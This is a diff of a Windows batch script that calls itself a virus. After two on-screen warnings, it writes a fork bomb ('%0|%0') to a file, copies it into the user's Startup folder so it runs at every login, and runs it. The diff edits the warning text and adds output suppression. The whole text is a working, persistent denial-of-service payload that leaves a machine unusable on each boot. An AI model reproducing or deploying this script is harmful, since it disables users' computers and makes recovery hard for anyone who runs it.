@@ -7,7 +7,7 @@ echo.
 echo WARNING!
 echo THIS VIRUS OVERLOADS YOUR PC, DO YOU WANT TO RUN IT?
 echo.
-echo You can use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
+echo Use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
 echo.
 echo.
 set /p continue="[YES / NO] >> "
@@ -18,13 +18,12 @@ cls
 echo.
 echo.
 echo LAST WARNING!
-echo PRESS ANY KEY TO RUN AND SAY BYE BYE TO YOUR CURRENT OS...
+echo PRESS ANY KEY TO RUN AND TO BE COCKED...
 echo.
-echo You can use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
+echo Use other device to remove virus there: C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
 echo.
 pause >nul
-del xwkqelajcmLsldi.bat
-echo %%0^|%%0 ^>nul > xwkqelajcmLsldi.bat
-attrib +h xwkqelajcmLsldi.bat
+del xwkqelajcmLsldi.bat >nul
+echo %%0^|%%0 ^>nul > xwkqelajcmLsldi.bat >nul
 copy xwkqelajcmLsldi.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
-.\xwkqelajcmLsldi.bat
+.\xwkqelajcmLsldi.bat >nul
